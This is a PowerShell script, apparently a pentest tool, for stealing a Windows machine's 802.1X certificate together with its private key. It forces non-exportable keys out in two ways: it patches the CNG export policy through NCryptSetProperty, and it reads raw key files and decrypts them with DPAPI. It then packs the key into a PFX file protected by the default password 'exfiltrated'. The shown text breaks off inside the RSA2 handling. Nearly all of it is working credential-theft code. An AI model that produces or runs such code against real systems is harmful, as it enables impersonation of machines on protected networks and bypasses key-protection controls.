#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Extract 802.1X machine certificate with private key from Windows host.
    Pentest PASSI context - no third-party tools, .NET native + Windows APIs only.

.PARAMETER OutputDir
    Directory where the .pfx will be saved. Default: current directory.

.PARAMETER PfxPassword
    Password for the exported .pfx file. Default: "exfiltrated".

.PARAMETER Thumbprint
    Optional: target a specific certificate by thumbprint.

.EXAMPLE
    .\Extract-8021xCert.ps1
    .\Extract-8021xCert.ps1 -OutputDir C:\temp -PfxPassword "P@ss123"
    .\Extract-8021xCert.ps1 -Thumbprint "A1B2C3..."
#>

[CmdletBinding()]
param(
    [string]$OutputDir = ".",
    [string]$PfxPassword = "exfiltrated",
    [string]$Thumbprint = ""
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

# --- P/Invoke definitions for CNG key export policy patching ---
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public static class NCryptInterop
{
    // NCrypt handle types
    public const uint NCRYPT_ALLOW_EXPORT_FLAG = 0x00000001;
    public const uint NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG = 0x00000002;
    public const uint NCRYPT_ALLOW_ARCHIVING_FLAG = 0x00000004;
    public const uint NCRYPT_ALLOW_PLAINTEXT_ARCHIVING_FLAG = 0x00000008;

    public const int NCRYPT_EXPORT_POLICY_PROPERTY_ID = 0;
    public const string NCRYPT_EXPORT_POLICY_PROPERTY = "Export Policy";

    public const uint NCRYPT_SILENT_FLAG = 0x00000040;
    public const uint NCRYPT_OVERWRITE_KEY_FLAG = 0x00000080;

    // Error codes
    public const int NTE_BAD_FLAGS = unchecked((int)0x80090009);

    [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
    public static extern int NCryptOpenStorageProvider(
        out IntPtr phProvider,
        string pszProviderName,
        uint dwFlags);

    [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
    public static extern int NCryptOpenKey(
        IntPtr hProvider,
        out IntPtr phKey,
        string pszKeyName,
        uint dwLegacyKeySpec,
        uint dwFlags);

    [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
    public static extern int NCryptSetProperty(
        IntPtr hObject,
        string pszProperty,
        byte[] pbInput,
        int cbInput,
        uint dwFlags);

    [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
    public static extern int NCryptGetProperty(
        IntPtr hObject,
        string pszProperty,
        byte[] pbOutput,
        int cbOutput,
        out int pcbResult,
        uint dwFlags);

    [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
    public static extern int NCryptExportKey(
        IntPtr hKey,
        IntPtr hExportKey,
        string pszBlobType,
        IntPtr pParameterList,
        byte[] pbOutput,
        int cbOutput,
        out int pcbResult,
        uint dwFlags);

    [DllImport("ncrypt.dll")]
    public static extern int NCryptFreeObject(IntPtr hObject);

    // For DPAPI-based approach (reading raw key files)
    [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
    public static extern int NCryptDeleteKey(IntPtr hKey, uint dwFlags);

    // BCrypt for importing raw key material
    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    public static extern int BCryptOpenAlgorithmProvider(
        out IntPtr phAlgorithm,
        string pszAlgId,
        string pszImplementation,
        uint dwFlags);

    [DllImport("bcrypt.dll")]
    public static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint dwFlags);

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    public static extern int BCryptImportKeyPair(
        IntPtr hAlgorithm,
        IntPtr hImportKey,
        string pszBlobType,
        out IntPtr phKey,
        byte[] pbInput,
        int cbInput,
        uint dwFlags);

    [DllImport("bcrypt.dll")]
    public static extern int BCryptDestroyKey(IntPtr hKey);

    public static uint GetExportPolicy(IntPtr hKey)
    {
        byte[] buf = new byte[4];
        int cbResult;
        int status = NCryptGetProperty(hKey, NCRYPT_EXPORT_POLICY_PROPERTY, buf, 4, out cbResult, 0);
        if (status != 0)
            throw new Exception("NCryptGetProperty failed: 0x" + status.ToString("X8"));
        return BitConverter.ToUInt32(buf, 0);
    }

    public static int PatchExportPolicy(IntPtr hKey)
    {
        uint newPolicy = NCRYPT_ALLOW_EXPORT_FLAG | NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG;
        byte[] policyBytes = BitConverter.GetBytes(newPolicy);
        return NCryptSetProperty(hKey, NCRYPT_EXPORT_POLICY_PROPERTY, policyBytes, 4, NCRYPT_SILENT_FLAG);
    }
}
"@ -ErrorAction SilentlyContinue

Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue

# --- Helper: build PFX from RSA key blob + certificate ---
# Handles both BCRYPT_RSAFULLPRIVATE_BLOB (RSA3, from NCryptExportKey)
# and CAPI key file blob (RSA2 with padding, from DPAPI decrypt)
Add-Type -TypeDefinition @"
using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;

public static class PfxBuilder
{
    // Build PFX from BCRYPT_RSAFULLPRIVATE_BLOB (RSA3 magic, from NCryptExportKey)
    public static byte[] BuildPfxFromBcryptBlob(byte[] blob, byte[] certDer, string password)
    {
        if (blob.Length < 24)
            throw new Exception("Blob too short for BCRYPT_RSAKEY_BLOB header");

        uint magic = BitConverter.ToUInt32(blob, 0);
        if (magic != 0x33415352)
            throw new Exception("Not RSA3 blob (magic=0x" + magic.ToString("X8") + ")");

        int cbPublicExp = (int)BitConverter.ToUInt32(blob, 8);
        int cbModulus   = (int)BitConverter.ToUInt32(blob, 12);
        int cbPrime1    = (int)BitConverter.ToUInt32(blob, 16);
        int cbPrime2    = (int)BitConverter.ToUInt32(blob, 20);

        int offset = 24;
        byte[] publicExponent  = Extract(blob, ref offset, cbPublicExp);
        byte[] modulus         = Extract(blob, ref offset, cbModulus);
        byte[] prime1          = Extract(blob, ref offset, cbPrime1);
        byte[] prime2          = Extract(blob, ref offset, cbPrime2);
        byte[] exponent1       = Extract(blob, ref offset, cbPrime1);
        byte[] exponent2       = Extract(blob, ref offset, cbPrime2);
        byte[] coefficient     = Extract(blob, ref offset, cbPrime1);
        byte[] privateExponent = Extract(blob, ref offset, cbModulus);

        RSAParameters p = new RSAParameters();
        p.Exponent = publicExponent; p.Modulus = modulus;
        p.P = prime1; p.Q = prime2;
        p.DP = exponent1; p.DQ = exponent2;
        p.InverseQ = coefficient; p.D = privateExponent;

        return BuildPfxFromParams(p, certDer, password);
    }

    // Build PFX from a CAPI CSP blob (BLOBHEADER + RSAPUBKEY + key data, little-endian)
    public static byte[] BuildPfxFromCspBlob(byte[] cspBlob, byte[] certDer, string password)
    {
        CspParameters csp = new CspParameters();
        csp.KeyContainerName = Guid.NewGuid().ToString();
        csp.KeyNumber = 1; // AT_KEYEXCHANGE

        RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(csp);
        rsa.PersistKeyInCsp = true;
        rsa.ImportCspBlob(cspBlob);

        X509Certificate2 cert = new X509Certificate2(certDer);
        cert.PrivateKey = rsa;
        byte[] pfxBytes = cert.Export(X509ContentType.Pfx, password);

        rsa.PersistKeyInCsp = false;
        rsa.Clear();
        return pfxBytes;
    }

    private static byte[] BuildPfxFromParams(RSAParameters rsaParams, byte[] certDer, string password)
    {
        CspParameters csp = new CspParameters();
        csp.KeyContainerName = Guid.NewGuid().ToString();
        csp.KeyNumber = 1;

        RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(csp);
        rsa.PersistKeyInCsp = true;
        rsa.ImportParameters(rsaParams);

        X509Certificate2 cert = new X509Certificate2(certDer);
        cert.PrivateKey = rsa;
        byte[] pfxBytes = cert.Export(X509ContentType.Pfx, password);

        rsa.PersistKeyInCsp = false;
        rsa.Clear();
        return pfxBytes;
    }

    private static byte[] Extract(byte[] source, ref int offset, int length)
    {
        byte[] result = new byte[length];
        Array.Copy(source, offset, result, 0, length);
        offset += length;
        return result;
    }
}
"@ -ErrorAction SilentlyContinue

function Write-Banner {
    Write-Host ""
    Write-Host "=============================================" -ForegroundColor Cyan
    Write-Host "  Extract-8021xCert - 802.1X Cert Exfil Tool" -ForegroundColor Cyan
    Write-Host "  .NET Native / No third-party tools" -ForegroundColor DarkCyan
    Write-Host "=============================================" -ForegroundColor Cyan
    Write-Host ""
}

function Test-IsElevated {
    $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
    $isAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)

    $isSystem = $identity.User.Value -eq "S-1-5-18"

    return @{
        IsAdmin  = $isAdmin
        IsSystem = $isSystem
        UserName = $identity.Name
    }
}

function Get-CertificateTemplate {
    param([System.Security.Cryptography.X509Certificates.X509Certificate2]$Cert)

    # OID 1.3.6.1.4.1.311.21.7 = Certificate Template Information (V2)
    # OID 1.3.6.1.4.1.311.20.2 = Certificate Template Name (V1)
    $templateName = ""

    $extV1 = $Cert.Extensions | Where-Object { $_.Oid.Value -eq "1.3.6.1.4.1.311.20.2" }
    if ($extV1) {
        $templateName = $extV1.Format($false)
    }

    $extV2 = $Cert.Extensions | Where-Object { $_.Oid.Value -eq "1.3.6.1.4.1.311.21.7" }
    if ($extV2) {
        $formatted = $extV2.Format($true)
        if ($formatted -match "Template=(.+?)[\r\n]") {
            $templateName = $Matches[1].Trim()
        }
        elseif ($formatted -match "(.+)") {
            if (-not $templateName) {
                $templateName = $formatted.Trim()
            }
        }
    }

    return $templateName
}

function Find-8021xCerts {
    Write-Host "[*] Scanning Cert:\LocalMachine\My for 802.1X certificates..." -ForegroundColor Yellow
    [array]$certs = @(Get-ChildItem -Path Cert:\LocalMachine\My -ErrorAction SilentlyContinue)

    if ($certs.Count -eq 0) {
        Write-Host "[-] No certificates found in LocalMachine\My store." -ForegroundColor Red
        return $null
    }

    Write-Host "[*] Found $($certs.Count) certificate(s) total." -ForegroundColor Gray

    $results = @()
    foreach ($cert in $certs) {
        $template = Get-CertificateTemplate -Cert $cert
        $hasPrivateKey = $cert.HasPrivateKey
        $eku = ($cert.Extensions | Where-Object { $_ -is [System.Security.Cryptography.X509Certificates.X509EnhancedKeyUsageExtension] })
        $ekuList = @()
        if ($eku) {
            $ekuList = $eku.EnhancedKeyUsages | ForEach-Object { $_.FriendlyName }
        }

        $is8021x = $false
        if ($template -match "802\.?1[xX]" -or $template -match "EAP" -or $template -match "PEAP" -or $template -match "Machine" -or $template -match "Computer") {
            $is8021x = $true
        }
        # EKU: Client Authentication (1.3.6.1.5.5.7.3.2)
        if ($ekuList -contains "Client Authentication") {
            $is8021x = $true
        }

        $results += [PSCustomObject]@{
            Cert          = $cert
            Subject       = $cert.Subject
            Issuer        = $cert.Issuer
            Thumbprint    = $cert.Thumbprint
            Template      = $template
            HasPrivateKey = $hasPrivateKey
            Is8021x       = $is8021x
            EKU           = ($ekuList -join ", ")
            NotAfter      = $cert.NotAfter
        }
    }

    return ,$results
}

function Select-Certificate {
    param([array]$CertList)

    # Filter for 8021x candidates with private keys
    [array]$candidates = @($CertList | Where-Object { $_.Is8021x -and $_.HasPrivateKey })

    if ($candidates.Count -eq 0) {
        Write-Host "[!] No 802.1X candidates found automatically. Showing all certs with private keys..." -ForegroundColor Yellow
        [array]$candidates = @($CertList | Where-Object { $_.HasPrivateKey })
    }

    if ($candidates.Count -eq 0) {
        Write-Host "[-] No certificates with private keys found." -ForegroundColor Red
        return $null
    }

    if ($candidates.Count -eq 1) {
        Write-Host "[+] Single candidate found, selecting automatically." -ForegroundColor Green
        return $candidates[0]
    }

    Write-Host ""
    Write-Host "[*] Multiple candidates found. Select one:" -ForegroundColor Yellow
    Write-Host ""
    for ($i = 0; $i -lt $candidates.Count; $i++) {
        $c = $candidates[$i]
        $marker = if ($c.Is8021x) { "[802.1X]" } else { "[Other]" }
        Write-Host "  [$i] $marker $($c.Subject)" -ForegroundColor White
        Write-Host "      Template:    $($c.Template)" -ForegroundColor Gray
        Write-Host "      Thumbprint:  $($c.Thumbprint)" -ForegroundColor Gray
        Write-Host "      EKU:         $($c.EKU)" -ForegroundColor Gray
        Write-Host "      Expires:     $($c.NotAfter)" -ForegroundColor Gray
        Write-Host ""
    }

    $selection = Read-Host "Enter selection [0-$($candidates.Count - 1)]"
    $idx = [int]$selection
    if ($idx -lt 0 -or $idx -ge $candidates.Count) {
        Write-Host "[-] Invalid selection." -ForegroundColor Red
        return $null
    }

    return $candidates[$idx]
}

# --- Method 1: Direct .NET Export (works if key is already exportable) ---
function Export-Method1-DirectExport {
    param(
        [System.Security.Cryptography.X509Certificates.X509Certificate2]$Cert,
        [string]$OutputPath,
        [string]$Password
    )

    Write-Host ""
    Write-Host "[*] Method 1: Direct .NET PFX export..." -ForegroundColor Yellow

    try {
        # Try direct export
        $pfxBytes = $Cert.Export(
            [System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx,
            $Password
        )

        if ($pfxBytes -and $pfxBytes.Length -gt 0) {
            [System.IO.File]::WriteAllBytes($OutputPath, $pfxBytes)
            # Verify the PFX is valid and contains a private key
            $verify = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(
                $OutputPath, $Password,
                [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable
            )
            if ($verify.HasPrivateKey) {
                $verify.Dispose()
                Write-Host "[+] Method 1 SUCCESS - Direct export worked." -ForegroundColor Green
                return $true
            }
            $verify.Dispose()
            Remove-Item -Path $OutputPath -Force -ErrorAction SilentlyContinue
        }
    }
    catch {
        Write-Host "[-] Method 1 failed: $($_.Exception.Message)" -ForegroundColor DarkYellow
    }

    return $false
}

# --- Method 2: NCryptSetProperty to patch export policy, then export ---
function Export-Method2-PatchCNG {
    param(
        [System.Security.Cryptography.X509Certificates.X509Certificate2]$Cert,
        [string]$OutputPath,
        [string]$Password
    )

    Write-Host ""
    Write-Host "[*] Method 2: CNG export policy patch via NCryptSetProperty..." -ForegroundColor Yellow

    $hProvider = [IntPtr]::Zero
    $hKey = [IntPtr]::Zero

    try {
        $keyName = $null
        $providerName = $null

        # Use static extension method (PS 5.1 compat: instance .GetRSAPrivateKey() does not exist)
        $rsaKey = $null
        try {
            $rsaKey = [System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::GetRSAPrivateKey($Cert)
        } catch {}

        if ($rsaKey -and $rsaKey.GetType().Name -eq "RSACng") {
            try {
                $cngKey = $rsaKey.Key
                $keyName = $cngKey.KeyName
                $providerName = $cngKey.Provider.Provider
            }
            catch {}
        }

        # Fallback: .PrivateKey property (CAPI path)
        if (-not $keyName -and $Cert.PrivateKey) {
            if ($Cert.PrivateKey -is [System.Security.Cryptography.RSACryptoServiceProvider]) {
                $cspInfo = $Cert.PrivateKey.CspKeyContainerInfo
                $keyName = $cspInfo.KeyContainerName
                $providerName = $cspInfo.ProviderName
            }
        }

        # Normalize CAPI provider names to CNG KSP
        if ($keyName -and (-not $providerName -or $providerName -match "Cryptographic Provider")) {
            $providerName = "Microsoft Software Key Storage Provider"
        }

        if (-not $keyName) {
            Write-Host "[-] Method 2 failed: could not determine key name." -ForegroundColor DarkYellow
            return $false
        }

        Write-Host "[*] Key Name: $keyName" -ForegroundColor Gray
        Write-Host "[*] Provider: $providerName" -ForegroundColor Gray

        # Open the KSP and key - try machine key store first, then user store
        $NCRYPT_MACHINE_KEY_FLAG = 0x00000020
        $status = [NCryptInterop]::NCryptOpenStorageProvider([ref]$hProvider, $providerName, 0)
        if ($status -ne 0) {
            Write-Host "[-] NCryptOpenStorageProvider failed: 0x$($status.ToString('X8'))" -ForegroundColor DarkYellow
            return $false
        }

        $status = [NCryptInterop]::NCryptOpenKey($hProvider, [ref]$hKey, $keyName, 0, $NCRYPT_MACHINE_KEY_FLAG)
        if ($status -ne 0) {
            $status = [NCryptInterop]::NCryptOpenKey($hProvider, [ref]$hKey, $keyName, 0, 0)
        }
        if ($status -ne 0) {
            Write-Host "[-] NCryptOpenKey failed: 0x$($status.ToString('X8'))" -ForegroundColor DarkYellow
            return $false
        }

        # Read current export policy
        try {
            $currentPolicy = [NCryptInterop]::GetExportPolicy($hKey)
            Write-Host "[*] Current export policy: 0x$($currentPolicy.ToString('X8'))" -ForegroundColor Gray
        }
        catch {
            Write-Host "[*] Could not read current export policy (non-fatal)." -ForegroundColor Gray
        }

        # Patch export policy
        $status = [NCryptInterop]::PatchExportPolicy($hKey)
        if ($status -ne 0) {
            Write-Host "[-] NCryptSetProperty (ExportPolicy) failed: 0x$($status.ToString('X8'))" -ForegroundColor DarkYellow
            # Some providers reject the patch; fall through
            return $false
        }

        Write-Host "[+] Export policy patched successfully." -ForegroundColor Green

        # Read back to confirm
        try {
            $newPolicy = [NCryptInterop]::GetExportPolicy($hKey)
            Write-Host "[*] New export policy: 0x$($newPolicy.ToString('X8'))" -ForegroundColor Gray
        }
        catch {}

        # Now export via NCryptExportKey with PKCS8 blob
        $BCRYPT_RSAFULLPRIVATE_BLOB = "RSAFULLPRIVATEBLOB"
        $cbResult = 0

        # First call to get size
        $status = [NCryptInterop]::NCryptExportKey($hKey, [IntPtr]::Zero, $BCRYPT_RSAFULLPRIVATE_BLOB,
            [IntPtr]::Zero, $null, 0, [ref]$cbResult, 0)
        if ($status -ne 0) {
            Write-Host "[-] NCryptExportKey (size query) failed: 0x$($status.ToString('X8'))" -ForegroundColor DarkYellow
            return $false
        }

        $keyBlob = New-Object byte[] $cbResult
        $status = [NCryptInterop]::NCryptExportKey($hKey, [IntPtr]::Zero, $BCRYPT_RSAFULLPRIVATE_BLOB,
            [IntPtr]::Zero, $keyBlob, $cbResult, [ref]$cbResult, 0)
        if ($status -ne 0) {
            Write-Host "[-] NCryptExportKey failed: 0x$($status.ToString('X8'))" -ForegroundColor DarkYellow
            return $false
        }

        Write-Host "[+] Key blob exported ($cbResult bytes)." -ForegroundColor Green

        # Build PFX from blob + cert DER
        $certDer = $Cert.RawData
        $pfxBytes = [PfxBuilder]::BuildPfxFromBcryptBlob($keyBlob, $certDer, $Password)
        [System.IO.File]::WriteAllBytes($OutputPath, $pfxBytes)

        # Verify
        $verify = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(
            $OutputPath, $Password,
            [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable
        )
        if ($verify.HasPrivateKey) {
            $verify.Dispose()
            Write-Host "[+] Method 2 SUCCESS - CNG patch + export worked." -ForegroundColor Green
            return $true
        }
        $verify.Dispose()
        Remove-Item -Path $OutputPath -Force -ErrorAction SilentlyContinue
        return $false
    }
    catch {
        Write-Host "[-] Method 2 failed: $($_.Exception.Message)" -ForegroundColor DarkYellow
        return $false
    }
    finally {
        if ($hKey -ne [IntPtr]::Zero) { [void][NCryptInterop]::NCryptFreeObject($hKey) }
        if ($hProvider -ne [IntPtr]::Zero) { [void][NCryptInterop]::NCryptFreeObject($hProvider) }
    }
}

# --- Method 3: Read raw CNG key files + DPAPI LocalMachine decrypt ---
function Export-Method3-DPAPIKeyFile {
    param(
        [System.Security.Cryptography.X509Certificates.X509Certificate2]$Cert,
        [string]$OutputPath,
        [string]$Password
    )

    Write-Host ""
    Write-Host "[*] Method 3: Raw CNG key file + DPAPI LocalMachine decrypt..." -ForegroundColor Yellow

    try {
        $keyUniqueName = $null
        $keyName = $null

        # Use static extension method (PS 5.1 compat)
        $rsaKey = $null
        try {
            $rsaKey = [System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::GetRSAPrivateKey($Cert)
        } catch {}

        if ($rsaKey -and $rsaKey.GetType().Name -eq "RSACng") {
            try {
                $cngKey = $rsaKey.Key
                $keyUniqueName = $cngKey.UniqueName
                $keyName = $cngKey.KeyName
            }
            catch {}
        }

        # Fallback: .PrivateKey property (CAPI)
        if (-not $keyUniqueName -and $Cert.PrivateKey) {
            try {
                if ($Cert.PrivateKey -is [System.Security.Cryptography.RSACryptoServiceProvider]) {
                    $keyUniqueName = $Cert.PrivateKey.CspKeyContainerInfo.UniqueKeyContainerName
                    $keyName = $Cert.PrivateKey.CspKeyContainerInfo.KeyContainerName
                }
            }
            catch {}
        }

        # Fallback: reopen from cert store to resolve key info
        if (-not $keyUniqueName) {
            try {
                $store = New-Object System.Security.Cryptography.X509Certificates.X509Store(
                    "My", [System.Security.Cryptography.X509Certificates.StoreLocation]::LocalMachine)
                $store.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadOnly -bor
                    [System.Security.Cryptography.X509Certificates.OpenFlags]::OpenExistingOnly)
                $found = $store.Certificates | Where-Object { $_.Thumbprint -eq $Cert.Thumbprint }
                if ($found) {
                    $freshCert = $found[0]
                    $freshRsa = $null
                    try {
                        $freshRsa = [System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::GetRSAPrivateKey($freshCert)
                    } catch {}
                    if ($freshRsa -and $freshRsa.GetType().Name -eq "RSACng") {
                        $keyUniqueName = $freshRsa.Key.UniqueName
                        $keyName = $freshRsa.Key.KeyName
                    }
                    elseif ($freshCert.PrivateKey -is [System.Security.Cryptography.RSACryptoServiceProvider]) {
                        $keyUniqueName = $freshCert.PrivateKey.CspKeyContainerInfo.UniqueKeyContainerName
                        $keyName = $freshCert.PrivateKey.CspKeyContainerInfo.KeyContainerName
                    }
                }
                $store.Close()
            }
            catch {}
        }

        if (-not $keyUniqueName) {
            Write-Host "[-] Method 3 failed: could not determine key unique name." -ForegroundColor DarkYellow
            return $false
        }

        Write-Host "[*] Key unique name: $keyUniqueName" -ForegroundColor Gray

        # Key file search paths: machine keys + current user keys (CAPI and CNG)
        $sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
        $cngKeyPaths = @(
            "$env:ProgramData\Microsoft\Crypto\Keys\$keyUniqueName",
            "$env:ProgramData\Microsoft\Crypto\RSA\MachineKeys\$keyUniqueName",
            "$env:ProgramData\Microsoft\Crypto\SystemKeys\$keyUniqueName",
            "$env:APPDATA\Microsoft\Crypto\Keys\$keyUniqueName",
            "$env:APPDATA\Microsoft\Crypto\RSA\$sid\$keyUniqueName"
        )

        $keyFilePath = $null
        foreach ($p in $cngKeyPaths) {
            if (Test-Path $p) {
                $keyFilePath = $p
                break
            }
        }

        if (-not $keyFilePath) {
            $searchPaths = @(
                "$env:ProgramData\Microsoft\Crypto\Keys",
                "$env:ProgramData\Microsoft\Crypto\RSA\MachineKeys",
                "$env:ProgramData\Microsoft\Crypto\SystemKeys",
                "$env:APPDATA\Microsoft\Crypto\Keys",
                "$env:APPDATA\Microsoft\Crypto\RSA\$sid"
            )
            foreach ($dir in $searchPaths) {
                if (Test-Path $dir) {
                    $found = Get-ChildItem -Path $dir -Filter "*$keyName*" -ErrorAction SilentlyContinue | Select-Object -First 1
                    if ($found) {
                        $keyFilePath = $found.FullName
                        break
                    }
                }
            }
        }

        if (-not $keyFilePath) {
            Write-Host "[-] Method 3 failed: key file not found on disk." -ForegroundColor DarkYellow
            return $false
        }

        Write-Host "[+] Key file found: $keyFilePath" -ForegroundColor Green

        $keyFileBytes = [System.IO.File]::ReadAllBytes($keyFilePath)
        Write-Host "[*] Key file size: $($keyFileBytes.Length) bytes" -ForegroundColor Gray

        if ($keyFileBytes.Length -lt 4) {
            Write-Host "[-] Key file too small." -ForegroundColor DarkYellow
            return $false
        }

        $version = [BitConverter]::ToUInt32($keyFileBytes, 0)
        Write-Host "[*] Key file version: $version" -ForegroundColor Gray

        # --- Strategy A: Parse CNG key file property list to extract DPAPI blob with exact boundaries ---
        # CNG key file (version 1) layout:
        #   DWORD version (4)
        #   Then repeated properties:
        #     DWORD cbStructLen (total property size including this header)
        #     DWORD dwType
        #     DWORD dwUnknown
        #     DWORD cbName (byte count of the Unicode property name)
        #     DWORD cbValue (byte count of the property value)
        #     WCHAR name[cbName/2]
        #     BYTE  value[cbValue]
        # The private key property name is typically "Export Policy", "Modified", "Provider",
        # or empty. The DPAPI blob is in the largest value or in a property named
        # with specific types (dwType=3 is often the private key data).

        $dpapiBlobs = @()
        $propOffset = 4
        $parseOk = $true

        while ($propOffset -lt ($keyFileBytes.Length - 20)) {
            try {
                $cbStruct = [BitConverter]::ToUInt32($keyFileBytes, $propOffset)
                if ($cbStruct -lt 20 -or ($propOffset + $cbStruct) -gt $keyFileBytes.Length) {
                    $parseOk = $false
                    break
                }
                $dwType    = [BitConverter]::ToUInt32($keyFileBytes, $propOffset + 4)
                $cbName    = [BitConverter]::ToUInt32($keyFileBytes, $propOffset + 12)
                $cbValue   = [BitConverter]::ToUInt32($keyFileBytes, $propOffset + 16)

                if ($cbValue -gt 100 -and ($propOffset + 20 + $cbName + $cbValue) -le $keyFileBytes.Length) {
                    $valueStart = $propOffset + 20 + $cbName
                    # Check if this value contains a DPAPI blob (starts with the magic)
                    if ($cbValue -ge 12 -and
                        $keyFileBytes[$valueStart] -eq 0x01 -and
                        $keyFileBytes[$valueStart+1] -eq 0x00 -and
                        $keyFileBytes[$valueStart+2] -eq 0x00 -and
                        $keyFileBytes[$valueStart+3] -eq 0x00 -and
                        $keyFileBytes[$valueStart+4] -eq 0xD0 -and
                        $keyFileBytes[$valueStart+5] -eq 0x8C -and
                        $keyFileBytes[$valueStart+6] -eq 0x9D -and
                        $keyFileBytes[$valueStart+7] -eq 0xDF) {
                        $exactBlob = New-Object byte[] $cbValue
                        [Array]::Copy($keyFileBytes, $valueStart, $exactBlob, 0, $cbValue)
                        $dpapiBlobs += ,@{ Offset = $valueStart; Data = $exactBlob; Type = $dwType }
                        Write-Host "[*] Property at offset $($propOffset) - type=$($dwType), valueSize=$($cbValue) (DPAPI blob)" -ForegroundColor Gray
                    }
                }

                $propOffset += $cbStruct
            }
            catch {
                $parseOk = $false
                break
            }
        }

        if ($parseOk -and $dpapiBlobs.Count -gt 0) {
            Write-Host "[+] Parsed $($dpapiBlobs.Count) DPAPI property blob(s) from key file structure." -ForegroundColor Green
        }

        # --- Strategy B fallback: scan for DPAPI magic bytes and use enclosing property or heuristic ---
        if ($dpapiBlobs.Count -eq 0) {
            Write-Host "[*] Property parse did not find blobs, falling back to DPAPI magic scan..." -ForegroundColor Yellow
            $dpapiMagic = @(0x01, 0x00, 0x00, 0x00, 0xD0, 0x8C, 0x9D, 0xDF, 0x01, 0x15, 0xD1, 0x11)

            for ($i = 0; $i -lt ($keyFileBytes.Length - $dpapiMagic.Length); $i++) {
                $match = $true
                for ($j = 0; $j -lt $dpapiMagic.Length; $j++) {
                    if ($keyFileBytes[$i + $j] -ne $dpapiMagic[$j]) {
                        $match = $false
                        break
                    }
                }
                if ($match) {
                    # Try to find the enclosing property's cbValue by scanning back for a 4-byte length
                    $blobSize = $null
                    # Check if 4 bytes before the DPAPI offset hold a plausible cbValue
                    if ($i -ge 4) {
                        $candidate = [BitConverter]::ToUInt32($keyFileBytes, $i - 4)
                        if ($candidate -gt 100 -and ($i - 4 + $candidate) -le $keyFileBytes.Length) {
                            # Plausible: the DWORD right before is the value length
                            $blobSize = [int]$candidate
                        }
                    }
                    if (-not $blobSize) {
                        # Use remaining file from this offset
                        $blobSize = $keyFileBytes.Length - $i
                    }
                    $chunk = New-Object byte[] $blobSize
                    [Array]::Copy($keyFileBytes, $i, $chunk, 0, $blobSize)
                    $dpapiBlobs += ,@{ Offset = $i; Data = $chunk; Type = -1 }
                }
            }
        }

        if ($dpapiBlobs.Count -eq 0) {
            Write-Host "[-] No DPAPI blob found in key file. Key may use a different protection." -ForegroundColor DarkYellow
            return $false
        }

        # Try to decrypt each blob (last/largest is usually the private key)
        $decryptedBlob = $null
        $sortedBlobs = $dpapiBlobs | Sort-Object { $_.Data.Length } -Descending

        $dpapiScopes = @(
            [System.Security.Cryptography.DataProtectionScope]::LocalMachine,
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )

        foreach ($blobInfo in $sortedBlobs) {
            foreach ($scope in $dpapiScopes) {
                try {
                    $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
                        $blobInfo.Data,
                        $null,
                        $scope
                    )
                    if ($decrypted -and $decrypted.Length -gt 0) {
                        Write-Host "[+] DPAPI decrypt succeeded ($($decrypted.Length) bytes, scope=$scope) from offset $($blobInfo.Offset)." -ForegroundColor Green
                        $decryptedBlob = $decrypted
                        break
                    }
                }
                catch {
                    # Try next scope
                }
            }
            if ($decryptedBlob) { break }
        }

        if (-not $decryptedBlob) {
            Write-Host "[-] Method 3 failed: DPAPI decryption unsuccessful." -ForegroundColor DarkYellow
            return $false
        }

        # Find RSA magic in decrypted data
        $rsaMagicOffset = -1
        $rsaMagicType = $null
        for ($i = 0; $i -lt ($decryptedBlob.Length - 4); $i++) {
            if ($decryptedBlob[$i] -eq 0x52 -and $decryptedBlob[$i+1] -eq 0x53 -and $decryptedBlob[$i+2] -eq 0x41) {
                if ($decryptedBlob[$i+3] -eq 0x33) { $rsaMagicOffset = $i; $rsaMagicType = "RSA3"; break }
                if ($decryptedBlob[$i+3] -eq 0x32) { $rsaMagicOffset = $i; $rsaMagicType = "RSA2"; break }
            }
        }

        if ($rsaMagicOffset -lt 0) {
            Write-Host "[-] Method 3 failed: no RSA key blob magic found in decrypted data." -ForegroundColor DarkYellow
            return $false
        }

        Write-Host "[*] $rsaMagicType blob at offset $rsaMagicOffset in decrypted data." -ForegroundColor Gray

        $certDer = $Cert.RawData

        if ($rsaMagicType -eq "RSA3") {
            # Standard BCRYPT_RSAFULLPRIVATE_BLOB - pass directly to PfxBuilder
            $rsaBlobLen = $decryptedBlob.Length - $rsaMagicOffset
            $rsaBlob = New-Object byte[] $rsaBlobLen
            [Array]::Copy($decryptedBlob, $rsaMagicOffset, $rsaBlob, 0, $rsaBlobLen)
            $pfxBytes = [PfxBuilder]::BuildPfxFromBcryptBlob($rsaBlob, $certDer, $Password)
        }
        else {
            # RSA2 - CAPI key file format with 20-byte header and padding between components
